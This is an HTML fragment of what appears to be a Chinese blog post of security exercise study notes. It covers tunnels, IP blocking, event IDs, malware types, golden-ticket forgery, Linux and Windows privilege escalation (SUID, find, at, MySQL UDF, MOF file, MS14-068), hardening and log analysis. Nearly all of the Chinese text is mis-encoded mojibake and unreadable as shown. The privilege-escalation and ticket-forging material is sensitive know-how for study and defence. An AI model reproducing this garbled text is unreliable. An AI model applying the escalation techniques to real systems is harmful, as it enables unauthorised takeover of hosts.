<h3 id="å†…ç½‘éš§é“ï¼š"><a href="#å†…ç½‘éš§é“ï¼š" class="headerlink" title="å†…ç½‘éš§é“ï¼š"></a>å†…ç½‘éš§é“ï¼š</h3><p>tcpéš§é“ï¼šåŸºç¡€çš„ TCP æ˜ å°„ï¼Œé€‚ç”¨äºå¤§å¤šæ•°æœåŠ¡ï¼Œä¾‹å¦‚<strong>è¿œç¨‹æ¡Œé¢ã€SSH</strong></p>
<p>udpéš§é“ï¼šåŸºç¡€çš„ UDP æ˜ å°„ï¼Œé€‚ç”¨äºåŸŸåè§£æã€éƒ¨åˆ†åŸºäº UDP åè®®çš„<strong>æ¸¸æˆ</strong></p>
<p>httpï¼šæ­å»ºç½‘ç«™ä¸“ç”¨æ˜ å°„ï¼Œé€šè¿‡ 80 ç«¯å£è®¿é—®</p>
<p>httpsï¼šå¸¦æœ‰ SSL åŠ å¯†çš„ç½‘ç«™æ˜ å°„ï¼Œé€šè¿‡ 443 ç«¯å£è®¿é—®ï¼Œæ˜ å°„ç›®æ ‡éœ€è¦æ”¯æŒ SSL</p>
<h3 id="æŠ¤ç½‘æ—¶å¯¹IPçš„åˆ¤æ–­"><a href="#æŠ¤ç½‘æ—¶å¯¹IPçš„åˆ¤æ–­" class="headerlink" title="æŠ¤ç½‘æ—¶å¯¹IPçš„åˆ¤æ–­"></a>æŠ¤ç½‘æ—¶å¯¹IPçš„åˆ¤æ–­</h3><p>å¦‚æœè¯¥IPåœ¨æŠ¤ç½‘æœŸé—´é¢‘ç¹å‡ºç°ï¼Œè€ŒæŠ¤ç½‘ä¹‹å‰åŸºæœ¬ä¸Šæœªå‡ºç°è¿‡ï¼Œé‚£ä¹ˆæ”¹IPå¾ˆæœ‰å¯èƒ½æ˜¯çº¢é˜ŸIPã€‚å³å°é”è¯¥IPã€‚</p>
<p>æŠ¤ç½‘ä¸­å°é”çº¢é˜ŸIPçš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ol>
<li><p>ä½¿ç”¨é˜²ç«å¢™ï¼ˆ<strong>WAF</strong>ï¼‰ï¼šé˜²ç«å¢™å¯ä»¥è®¾ç½®è§„åˆ™ï¼Œå°†çº¢é˜ŸIPåŠ å…¥é»‘åå•ï¼Œä»è€Œç¦æ­¢å®ƒä»¬è®¿é—®å—ä¿æŠ¤çš„ç½‘ç»œæˆ–ç³»ç»Ÿã€‚</p>
</li>
<li><p>ä½¿ç”¨å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆ<strong>IDS</strong>ï¼‰ï¼šå…¥ä¾µæ£€æµ‹ç³»ç»Ÿå¯ä»¥ç›‘æµ‹ç½‘ç»œæµé‡å’Œç³»ç»Ÿè¡Œä¸ºï¼Œå½“æ£€æµ‹åˆ°çº¢é˜ŸIPçš„æ”»å‡»è¡Œä¸ºæ—¶ï¼Œå¯ä»¥è‡ªåŠ¨å°†å…¶åŠ å…¥é»‘åå•æˆ–è€…é˜»æ­¢å…¶è®¿é—®ã€‚</p>
</li>
<li><p>ä½¿ç”¨åå‘ä»£ç†ï¼ˆå¸¸è§çš„æœ‰CFï¼‰ï¼šåœ¨åå‘ä»£ç†æœåŠ¡å™¨ä¸Šè®¾ç½®è§„åˆ™ï¼Œå½“æ£€æµ‹åˆ°çº¢é˜ŸIPçš„æ”»å‡»è¡Œä¸ºæ—¶ï¼Œå¯ä»¥å°†å…¶è¯·æ±‚é‡å®šå‘åˆ°ä¸€ä¸ªé”™è¯¯é¡µé¢æˆ–è€…è¿›è¡Œæ‹¦æˆªã€‚</p>
</li>
<li><h5 id="ä½¿ç”¨IPè¿‡æ»¤å™¨ï¼šå¯ä»¥ä½¿ç”¨ä¸“é—¨çš„IPè¿‡æ»¤å™¨ï¼Œå°†çº¢é˜ŸIPåŠ å…¥é»‘åå•ä¸­ï¼Œä»è€Œç¦æ­¢å…¶è®¿é—®å—ä¿æŠ¤çš„ç½‘ç»œæˆ–ç³»ç»Ÿã€‚"><a href="#ä½¿ç”¨IPè¿‡æ»¤å™¨ï¼šå¯ä»¥ä½¿ç”¨ä¸“é—¨çš„IPè¿‡æ»¤å™¨ï¼Œå°†çº¢é˜ŸIPåŠ å…¥é»‘åå•ä¸­ï¼Œä»è€Œç¦æ­¢å…¶è®¿é—®å—ä¿æŠ¤çš„ç½‘ç»œæˆ–ç³»ç»Ÿã€‚" class="headerlink" title="ä½¿ç”¨IPè¿‡æ»¤å™¨ï¼šå¯ä»¥ä½¿ç”¨ä¸“é—¨çš„IPè¿‡æ»¤å™¨ï¼Œå°†çº¢é˜ŸIPåŠ å…¥é»‘åå•ä¸­ï¼Œä»è€Œç¦æ­¢å…¶è®¿é—®å—ä¿æŠ¤çš„ç½‘ç»œæˆ–ç³»ç»Ÿã€‚"></a>ä½¿ç”¨IPè¿‡æ»¤å™¨ï¼šå¯ä»¥ä½¿ç”¨ä¸“é—¨çš„IPè¿‡æ»¤å™¨ï¼Œå°†çº¢é˜ŸIPåŠ å…¥é»‘åå•ä¸­ï¼Œä»è€Œç¦æ­¢å…¶è®¿é—®å—ä¿æŠ¤çš„ç½‘ç»œæˆ–ç³»ç»Ÿã€‚</h5></li>
</ol>
<h2 id="æ•æ„Ÿäº‹ä»¶id"><a href="#æ•æ„Ÿäº‹ä»¶id" class="headerlink" title="æ•æ„Ÿäº‹ä»¶id:"></a>æ•æ„Ÿäº‹ä»¶id:</h2><p>4624 ç™»å½•æˆåŠŸ<br>4625 ç™»å½•å¤±è´¥<br>4634 æ³¨é”€æˆåŠŸ<br>4647 ç”¨æˆ·å¯åŠ¨çš„æ³¨é”€<br>4672 ä½¿ç”¨è¶…çº§ç”¨æˆ·&#x2F;ç®¡ç†å‘˜ç”¨æˆ·è¿›è¡Œç™»å½•<br>4720 åˆ›å»ºç”¨æˆ·</p>
<h2 id="æŒ–çŸ¿ç—…æ¯’"><a href="#æŒ–çŸ¿ç—…æ¯’" class="headerlink" title="æŒ–çŸ¿ç—…æ¯’"></a>æŒ–çŸ¿ç—…æ¯’</h2><p>æŒ–çŸ¿ç—…æ¯’ï¼šæ¶ˆè€—ç”¨æˆ·CPUã€GPUèµ„æºï¼Œè¿›è¡Œå¤§é‡è¿ç®—ï¼Œè·å–åŠ å¯†è´§å¸çš„ç—…æ¯’ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/96df0c3d9adc28f32537fa7df52fe736.jpg" alt="1"></p>
<p>æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µå°†æŒ–çŸ¿ç¨‹åºæ¤å…¥å—å®³è€…çš„è®¡ç®—æœºä¸­ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹åˆ©ç”¨å…¶è®¡ç®—æœºçš„äº‘ç®—åŠ›è¿›è¡ŒæŒ–çŸ¿ï¼Œä»è€Œè·å–åˆ©ç›Šï¼Œè¿™ç±»éæ³•æ¤å…¥ç”¨æˆ·è®¡ç®—æœºçš„æŒ–çŸ¿ç¨‹åºå°±æ˜¯æŒ–çŸ¿æœ¨é©¬ã€‚</p>
<h2 id="è •è™«æ„ŸæŸ“"><a href="#è •è™«æ„ŸæŸ“" class="headerlink" title="è •è™«æ„ŸæŸ“"></a>è •è™«æ„ŸæŸ“</h2><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h3><p>è •è™«ç—…æ¯’çš„ç¨‹åºç»“æ„é€šå¸¸åŒ…æ‹¬ä¸‰ä¸ªæ¨¡å—ï¼š [3] </p>
<p>(1)ä¼ æ’­æ¨¡å—ï¼šè´Ÿè´£è •è™«çš„ä¼ æ’­ï¼Œå®ƒå¯ä»¥åˆ†ä¸ºæ‰«ææ¨¡å—ã€æ”»å‡»æ¨¡å—å’Œå¤åˆ¶æ¨¡å—ä¸‰ä¸ªå­æ¨¡å—ã€‚å…¶ä¸­ï¼Œæ‰«ææ¨¡å—è´Ÿè´£æ¢æµ‹å­˜åœ¨æ¼æ´çš„ä¸»æœºï¼›æ”»å‡»æ¨¡å—æŒ‰æ¼æ´æ”»å‡»æ­¥éª¤è‡ªåŠ¨æ”»å‡»æ‰¾åˆ°çš„å¯¹è±¡ï¼›å¤åˆ¶æ¨¡å—é€šè¿‡åŸä¸»æœºå’Œæ–°ä¸»æœºäº¤äº’å°†è •è™«ç¨‹åºå¤åˆ¶åˆ°æ–°ä¸»æœºå¹¶å¯åŠ¨ã€‚ [3] </p>
<p>(2)éšè—æ¨¡å—ï¼šä¾µå…¥ä¸»æœºåï¼Œè´Ÿè´£éšè—è •è™«ç¨‹åºã€‚ [3] </p>
<p>(3)ç›®çš„åŠŸèƒ½æ¨¡å—ï¼šå®ç°å¯¹è®¡ç®—æœºçš„æ§åˆ¶ã€ç›‘è§†æˆ–ç ´åç­‰ã€‚ [3] </p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æ ¹æ®è •è™«ç—…æ¯’çš„ç¨‹åºå…¶å·¥ä½œæµç¨‹å¯ä»¥åˆ†ä¸ºæ¼æ´æ‰«æã€æ”»å‡»ã€ä¼ æŸ“ã€ç°åœºå¤„ç†å››ä¸ªé˜¶æ®µï¼Œé¦–å…ˆè •è™«ç¨‹åºéšæœº(æˆ–åœ¨æŸç§å€¾å‘æ€§ç­–ç•¥ä¸‹)é€‰å–æŸä¸€æ®µIPåœ°å€ï¼Œæ¥ç€å¯¹è¿™ä¸€åœ°å€æ®µçš„ä¸»æœºæ‰«æï¼Œå½“æ‰«æåˆ°æœ‰æ¼æ´çš„è®¡ç®—æœºç³»ç»Ÿåï¼Œå°†è •è™«ä¸»ä½“è¿ç§»åˆ°ç›®æ ‡ä¸»æœºã€‚ç„¶åï¼Œè •è™«ç¨‹åºè¿›å…¥è¢«æ„ŸæŸ“çš„ç³»ç»Ÿï¼Œå¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œç°åœºå¤„ç†ã€‚åŒæ—¶ï¼Œè •è™«ç¨‹åºç”Ÿæˆå¤šä¸ªå‰¯æœ¬ï¼Œé‡å¤ä¸Šè¿°æµç¨‹ã€‚å„ä¸ªæ­¥éª¤çš„ç¹ç®€ç¨‹åº¦ä¹Ÿä¸åŒï¼Œæœ‰çš„ååˆ†å¤æ‚ï¼Œæœ‰çš„åˆ™éå¸¸ç®€å•ã€‚</p>
<h2 id="å‹’ç´¢ç—…æ¯’"><a href="#å‹’ç´¢ç—…æ¯’" class="headerlink" title="å‹’ç´¢ç—…æ¯’"></a>å‹’ç´¢ç—…æ¯’</h2><p>å‹’ç´¢ç—…æ¯’ï¼šèƒ½å¯¹ç”¨æˆ·æ–‡ä»¶è¿›è¡ŒåŠ å¯†çš„ç—…æ¯’ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/dba35b1c085dc28b692e4d0f9770e8ed.jpg" alt="lesuo"></p>
<h2 id="å®ç—…æ¯’"><a href="#å®ç—…æ¯’" class="headerlink" title="å®ç—…æ¯’"></a>å®ç—…æ¯’</h2><p>å®æ˜¯å¾®è½¯å…¬å¸ä¸ºå…¶Officeè½¯ä»¶åŒ…è®¾è®¡çš„ä¸€ä¸ªç‰¹æ®ŠåŠŸèƒ½ï¼Œç”±äºå…¶åŠŸèƒ½å¼ºå¤§ï¼Œä½¿å¾—é»‘å®¢å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„å®ä»£ç æ¥å®ç°æ¶æ„æ“ä½œï¼Œè¿™äº›ä»£ç å°±å«åšå®ç—…æ¯’ã€‚å®ç—…æ¯’å¸¸ä»¥åƒåœ¾é‚®ä»¶çš„æ–¹å¼å¯¹ç”¨æˆ·è¿›è¡Œæ”»å‡»ï¼Œå› ä¸ºä¼ªé€ çš„Officeæ–‡æ¡£ä¸å®¹æ˜“å¼•èµ·ç”¨æˆ·çš„æ€€ç–‘ï¼Œæ‰€ä»¥å½“ç”¨æˆ·æ¯«æ— é˜²å¤‡çš„æ‰“å¼€Officeæ–‡æ¡£å¹¶å¯ç”¨å®ä¹‹åï¼Œå®ç—…æ¯’ä¾¿å¼€å§‹äº†è¿è¡Œï¼Œå¯¹ç”¨æˆ·ä¸»æœºè¿›è¡Œæ¶æ„æ“ä½œã€‚</p>
<h2 id="å†…ç½‘é»„é‡‘ç¥¨æ®åŸç†"><a href="#å†…ç½‘é»„é‡‘ç¥¨æ®åŸç†" class="headerlink" title="å†…ç½‘é»„é‡‘ç¥¨æ®åŸç†"></a>å†…ç½‘é»„é‡‘ç¥¨æ®åŸç†</h2><p>åœ¨Kerberosè®¤è¯ä¸­,Clienté€šè¿‡AS(èº«ä»½è®¤è¯æœåŠ¡)è®¤è¯å,ASä¼šç»™Clientä¸€ä¸ª<br>Logon Session Keyå’ŒTGT,è€ŒLogon Session Keyå¹¶ä¸ä¼šä¿å­˜åœ¨KDCä¸­ï¼Œkrbtgtçš„NTLM Hashåˆæ˜¯å›ºå®šçš„,æ‰€ä»¥åªè¦å¾—åˆ°krbtgtçš„NTLM Hashï¼Œå°±å¯ä»¥ä¼ªé€ TGTå’ŒLogon Session Keyæ¥è¿›å…¥ä¸‹ä¸€æ­¥Clientä¸TGSçš„äº¤äº’ã€‚è€Œå·²æœ‰äº†é‡‘ç¥¨å,å°±è·³è¿‡ASéªŒè¯,ä¸ç”¨éªŒè¯è´¦æˆ·å’Œå¯†ç ,æ‰€ä»¥ä¹Ÿä¸æ‹…å¿ƒåŸŸç®¡å¯†ç ä¿®æ”¹ã€‚</p>
<h2 id="é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„åŒºåˆ«ï¼Ÿ"><a href="#é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„åŒºåˆ«ï¼Ÿ"></a>é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„åŒºåˆ«ï¼Ÿ</h2><p><strong>è·å–çš„æƒé™ä¸åŒ</strong><br>é‡‘ç¥¨:ä¼ªé€ çš„TGTï¼Œå¯ä»¥è·å–ä»»æ„Kerberosçš„è®¿é—®æƒé™</p>
<p>é“¶ç¥¨:ä¼ªé€ çš„STï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡ï¼Œå¦‚CIFS<br><strong>è®¤è¯æµç¨‹ä¸åŒ</strong><br>é‡‘ç¥¨: åŒKDCäº¤äº’ï¼Œä½†ä¸åŒASäº¤äº’<br>é“¶ç¥¨:ä¸åŒKDCäº¤äº’ï¼Œç›´æ¥è®¿é—®Server<br><strong>åŠ å¯†æ–¹å¼ä¸åŒ</strong><br>é‡‘ç¥¨: ç”±krbtgt NTLM Hash åŠ å¯†<br>é“¶ç¥¨: ç”±æœåŠ¡è´¦å· NTLM Hash åŠ å¯†</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="linuxææƒ"><a href="#linuxææƒ" class="headerlink" title="linuxææƒ"></a>linuxææƒ</h3><p>1.é€šè¿‡ su å‘½ä»¤æš´ç ´ root å¯†ç </p>
<p>2.å†…æ ¸æ¼æ´ææƒ</p>
<p>3.SUIDææƒï¼šSUIDå¯ä»¥è®©ç¨‹åºè°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬ä»¥ä¸€ä¸ªæ™®é€šç”¨æˆ·å»è¿è¡Œä¸€ä¸ªrootç”¨æˆ·æ‰€æœ‰çš„SUIDæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿è¡Œè¯¥æ–‡ä»¶æˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°rootæƒé™</p>
<p>4.findï¼šfindå®ç”¨ç¨‹åºfindå¯ç”¨äºå‘ç°å­˜å‚¨åœ¨ç³»ç»Ÿä¸Šã€‚ç„¶è€Œï¼Œå®ƒæ˜¯æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚å› æ­¤ï¼Œå¦‚æœå®ƒè¢«é…ç½®ä¸ºä½¿ç”¨ SUID æƒé™è¿è¡Œï¼Œé‚£ä¹ˆæ‰€æœ‰å°†é€šè¿‡ find æ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥ root èº«ä»½æ‰§è¡Œã€‚</p>
<h3 id="windowææƒ"><a href="#windowææƒ" class="headerlink" title="windowææƒ"></a>windowææƒ</h3><p><strong>1ã€ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</strong></p>
<p><strong>#æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">systeminfo  #æŸ¥çœ‹è¡¥ä¸
wmic qfe get Description,HotFixID,InstalledOn  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>#MSFåæ¸—é€æ‰«æ</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">post/windows/gather/enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>2ã€atå‘½ä»¤åˆ©ç”¨</strong></p>
<p><strong>åœ¨Windows2000ã€Windows 2003ã€Windows XP è¿™ä¸‰ç±»ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨atå‘½ä»¤å°†æƒé™æå‡è‡³systemæƒé™ã€‚</strong></p>
<p><strong>3.æ•°æ®åº“ææƒ</strong></p>
<pre class="line-numbers language-none"><code class="language-none">udfææƒï¼šé€šè¿‡åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå¯¹mysqlåŠŸèƒ½è¿›è¡Œæ‰©å……ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿä»»æ„å‘½ä»¤ï¼Œå°†mysqlè´¦å·rootè½¬åŒ–ä¸ºç³»ç»Ÿsystemæƒé™ã€‚
mofææƒï¼šåœ¨windowså¹³å°ä¸‹ï¼Œc:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof è¿™ä¸ªæ–‡ä»¶ä¼šæ¯é—´éš”ä¸€æ®µæ—¶é—´ï¼ˆå¾ˆçŸ­æš‚ï¼‰å°±ä¼šä»¥systemæƒé™æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬å°†æˆ‘ä»¬å…ˆè¦åšçš„äº‹é€šè¿‡ä»£ç å­˜å‚¨åˆ°è¿™ä¸ªmofæ–‡ä»¶ä¸­ï¼Œå°±å¯ä»¥å®ç°æƒé™æå‡ã€‚
å¯åŠ¨é¡¹ææƒï¼šå°†åé¢è„šæœ¬ä¸Šä¼ åˆ°ç³»ç»Ÿå¯åŠ¨ç›®å½•ï¼Œå½“æœåŠ¡å™¨é‡å¯å°±ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥è„šæœ¬ï¼Œä»è€Œè·å–ç³»ç»Ÿæƒé™ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>4.MS14-068 åŸŸç”¨æˆ·ææƒæ¼æ´</strong></p>
<p>æœåŠ¡ç¥¨æ®æ˜¯å®¢æˆ·ç«¯ç›´æ¥å‘é€ç»™æœåŠ¡å™¨,å¹¶è¯·æ±‚æœåŠ¡èµ„æºçš„ã€‚å¦‚æœæœåŠ¡å™¨æ²¡æœ‰å‘<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7&spm=1001.2101.3001.7020">åŸŸæ§</a>dcéªŒè¯pacçš„è¯,é‚£ä¹ˆå®¢æˆ·ç«¯å¯ä»¥ä¼ªé€ åŸŸç®¡çš„æƒé™æ¥è®¿é—®æœåŠ¡å™¨ã€‚</p>
<h2 id="ä¸»æœºåŠ å›º"><a href="#ä¸»æœºåŠ å›º" class="headerlink" title="ä¸»æœºåŠ å›º"></a>ä¸»æœºåŠ å›º</h2><h3 id="LinuxåŠ å›º"><a href="#LinuxåŠ å›º" class="headerlink" title="LinuxåŠ å›º"></a>LinuxåŠ å›º</h3><p>**1.**ä¿®æ”¹sshçš„é…ç½®æ–‡ä»¶ï¼Œç¦æ­¢rootç›´æ¥ç™»å½•</p>
<p>**2.**ä¿®æ”¹å¯†ç ç­–ç•¥é…ç½®æ–‡ä»¶ï¼Œç¡®ä¿å¯†ç æœ€å°é•¿åº¦ä¸º8ä½</p>
<p>**3.**ç¡®ä¿é”™è¯¯ç™»å½•3æ¬¡ï¼Œé”å®šæ­¤è´¦æˆ·5åˆ†é’Ÿ</p>
<p>**4.**ç¦æ­¢suéæ³•ææƒï¼Œåªå…è®¸rootå’Œwheelç»„ç”¨æˆ·suåˆ°root</p>
<p>**5.**ä¸å“åº”ICMPè¯·æ±‚</p>
<p>**6.**è®¾ç½®ç™»é™†è¶…æ—¶æ—¶é—´ä¸º10åˆ†é’Ÿ</p>
<p><strong>7.</strong> ç»“æŸéæ³•ç™»å½•ç”¨æˆ·</p>
<h3 id="WindowsåŠ å›º"><a href="#WindowsåŠ å›º" class="headerlink" title="WindowsåŠ å›º"></a><strong>WindowsåŠ å›º</strong></h3><p><strong>1.</strong>  <strong>ä¿®æ”¹3389ç«¯å£</strong></p>
<p><strong>2.</strong>  è®¾ç½®å®‰å…¨ç­–ç•¥ï¼Œä¸å…è®¸<strong>SAM</strong>å¸æˆ·çš„åŒ¿åæšä¸¾ï¼Œä¸å…è®¸SAMå¸æˆ·å’Œå…±äº«çš„åŒ¿åæšä¸¾</p>
<p><strong>3.<strong>åœ¨ç»„ç­–ç•¥ä¸­è®¾ç½®</strong>é˜»æ­¢è®¿é—®æ³¨å†Œè¡¨ç¼–è¾‘å·¥å…·</strong></p>
<p><strong>4.</strong>  <strong>å¼€å¯å®¡æ ¸å¯¹è±¡è®¿é—®ï¼ŒæˆåŠŸä¸å¤±è´¥ï¼›å¼€å¯å®¡æ ¸ç›®å½•æœåŠ¡è®¿é—®ï¼ŒæˆåŠŸä¸å¤±è´¥ï¼›å¼€å¯å®¡æ ¸ç³»ç»Ÿäº‹ä»¶ï¼ŒæˆåŠŸä¸å¤±è´¥</strong></p>
<p><strong>5.</strong>  <strong>ç¦æ­¢445ç«¯å£æ¼æ´</strong></p>
<p><strong>6.</strong>  <strong>è®¾ç½®å±å¹•ä¿æŠ¤åœ¨æ¢å¤æ—¶ä½¿ç”¨å¯†ç ä¿æŠ¤</strong></p>
<p><strong>7.</strong>  <strong>è®¾ç½®windowså¯†ç ç­–ç•¥</strong>ï¼šä½¿å¯†ç å¿…é¡»æ»¡è¶³å¤æ‚æ€§ï¼Œè®¾ç½®å¯†ç é•¿åº¦æœ€å°å€¼ä¸º8ä½ï¼Œè®¾ç½®å¯†ç æœ€é•¿å­˜ç•™æœŸä¸º30å¤©</p>
<p><strong>8.</strong>  å¼€å¯Windowsé˜²ç«å¢™ï¼Œ<strong>å…³é—­pingæœåŠ¡</strong>ï¼Œæ‰“å¼€3389ã€80ç­‰æœåŠ¡</p>
<p><strong>9.</strong>  <strong>å…³é—­ç³»ç»Ÿé»˜è®¤å…±äº«</strong></p>
<h2 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h2><h3 id="1-ç³»ç»Ÿæ—¥å¿—"><a href="#1-ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="1.ç³»ç»Ÿæ—¥å¿—"></a>1.ç³»ç»Ÿæ—¥å¿—</h3><p>åˆ†ææ–¹æ³•ï¼š</p>
<p>aã€å‰æï¼šå¼€å¯å®¡æ ¸ç­–ç•¥ï¼Œè‹¥æ—¥åç³»ç»Ÿå‡ºç°æ•…éšœã€å®‰å…¨äº‹æ•…åˆ™å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ’é™¤æ•…éšœï¼Œè¿½æŸ¥å…¥ä¾µè€…çš„ä¿¡æ¯ç­‰ã€‚</p>
<p>bã€Win+Ræ‰“å¼€è¿è¡Œï¼Œè¾“å…¥<code>eventvwr.msc</code>ï¼Œå›è½¦è¿è¡Œï¼Œæ‰“å¼€äº‹ä»¶æŸ¥çœ‹å™¨ã€‚</p>
<p>cã€å¯¼å‡ºåº”ç”¨ç¨‹åºæ—¥å¿—ã€å®‰å…¨æ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ï¼Œåˆ©ç”¨Log Parserè¿›è¡Œåˆ†æã€‚</p>
<h3 id="2-webè®¿é—®æ—¥å¿—"><a href="#2-webè®¿é—®æ—¥å¿—" class="headerlink" title="2.webè®¿é—®æ—¥å¿—"></a>2.webè®¿é—®æ—¥å¿—</h3><p>åˆ†ææ–¹æ³•ï¼š</p>
<p>aã€æ‰¾åˆ°ä¸­é—´ä»¶çš„webæ—¥å¿—ï¼Œæ‰“åŒ…åˆ°æœ¬åœ°æ–¹ä¾¿è¿›è¡Œåˆ†æã€‚</p>
<p>bã€æ¨èå·¥å…·ï¼š</p>
<ul>
<li>Windowsä¸‹ï¼Œæ¨èä½¿ç”¨EmEditorè¿›è¡Œæ—¥å¿—åˆ†æï¼Œæ”¯æŒå¤§æ–‡æœ¬ï¼Œæœç´¢æ•ˆç‡ä¸é”™ã€‚</li>
<li>Linuxä¸‹ï¼Œä½¿ç”¨Shellå‘½åç»„åˆæŸ¥è¯¢åˆ†æã€‚</li>
</ul>
<h2 id="æ­£å‘shellå’Œåå‘shell"><a href="#æ­£å‘shellå’Œåå‘shell" class="headerlink" title="æ­£å‘shellå’Œåå‘shell"></a><strong>æ­£å‘shellå’Œåå‘shell</strong></h2><p> æ­£å‘shellï¼šæ§åˆ¶ç«¯ä¸»åŠ¨å‘èµ·è¿æ¥å»è¿æ¥è¢«æ§åˆ¶ç«¯<br> åå‘shellï¼šè¢«æ§åˆ¶ç«¯ä¸»åŠ¨è¿æ¥æ§åˆ¶ç«¯</p>
<h2 id="é˜²ç«å¢™ä¸­çš„DMZåŒºåŸŸï¼ŒTruståŒºåŸŸï¼ŒUntruståŒºåŸŸ"><a href="#é˜²ç«å¢™ä¸­çš„DMZåŒºåŸŸï¼ŒTruståŒºåŸŸï¼ŒUntruståŒºåŸŸ" class="headerlink" title="é˜²ç«å¢™ä¸­çš„DMZåŒºåŸŸï¼ŒTruståŒºåŸŸï¼ŒUntruståŒºåŸŸ"></a>é˜²ç«å¢™ä¸­çš„DMZåŒºåŸŸï¼ŒTruståŒºåŸŸï¼ŒUntruståŒºåŸŸ</h2><h3 id="DMZåŒºåŸŸï¼ˆéå†›äº‹åŒ–åŒºï¼‰"><a href="#DMZåŒºåŸŸï¼ˆéå†›äº‹åŒ–åŒºï¼‰" class="headerlink" title="DMZåŒºåŸŸï¼ˆéå†›äº‹åŒ–åŒºï¼‰"></a>DMZåŒºåŸŸï¼ˆéå†›äº‹åŒ–åŒºï¼‰</h3><p> 1.ä¸¤ä¸ªé˜²ç«å¢™ä¹‹é—´çš„ç©ºé—´è¢«ç§°ä¸ºDMZã€‚ä¸Internetç›¸æ¯”ï¼ŒDMZå¯ä»¥æä¾›æ›´é«˜çš„å®‰å…¨æ€§ï¼Œä½†æ˜¯å…¶å®‰å…¨æ€§æ¯”å†…éƒ¨ç½‘ç»œä½ã€‚<br> 2.æœåŠ¡å™¨ å†… å¤–ç½‘éƒ½å¯ä»¥è®¿é—®,ä½†è¿˜æ˜¯ä¸å†…ç½‘éš”ç¦».<br> å°±ç®—æ˜¯é»‘å®¢æŠŠDMZæœåŠ¡å™¨æ‹¿ä¸‹,ä¹Ÿä¸èƒ½ä½¿ç”¨æœåŠ¡å™¨æ¥æ§åˆ¶å†…ç½‘çš„ç½‘ç»œ.èµ·åˆ°å®‰å…¨çš„ç­–ç•¥<br>TruståŒºåŸŸï¼Œ</p>
<h3 id="TruståŒºåŸŸï¼ˆå—ä¿¡åŒºï¼‰"><a href="#TruståŒºåŸŸï¼ˆå—ä¿¡åŒºï¼‰" class="headerlink" title="TruståŒºåŸŸï¼ˆå—ä¿¡åŒºï¼‰"></a>TruståŒºåŸŸï¼ˆå—ä¿¡åŒºï¼‰</h3><p> å¯ä¿¡ä»»çš„æ¥å£.æ˜¯å±€åŸŸç½‘çš„æ¥å£.æ­¤æ¥å£å¤–ç½‘å’ŒDMZæ— æ³•è®¿é—®.<br> å¤–éƒ¨ä¸èƒ½è®¿é—®trustå£<br> DMZä¸èƒ½è®¿é—®trustå£</p>
<h3 id="UntruståŒºåŸŸï¼ˆéå—ä¿¡åŒºï¼‰"><a href="#UntruståŒºåŸŸï¼ˆéå—ä¿¡åŒºï¼‰" class="headerlink" title="UntruståŒºåŸŸï¼ˆéå—ä¿¡åŒºï¼‰"></a>UntruståŒºåŸŸï¼ˆéå—ä¿¡åŒºï¼‰</h3><p> ä¸ä¿¡ä»»çš„æ¥å£,æ˜¯ç”¨æ¥æ¥internetçš„,è¿™ä¸ªæ¥å£çš„ä¿¡æ¯å†…ç½‘ä¸æ¥å—<br> å¯ä»¥é€šè¿‡untrustå£è®¿é—®DMZ,ä½†ä¸èƒ½è®¿é—®trustå£**</p>
]]></content>
      <categories>
        <category>hvv</category>
      </categories>
  </entry>
  <entry>
    <title>CTF ç”¨äºä¼ªé€ ipçš„httpè¯·æ±‚å¤´</title>
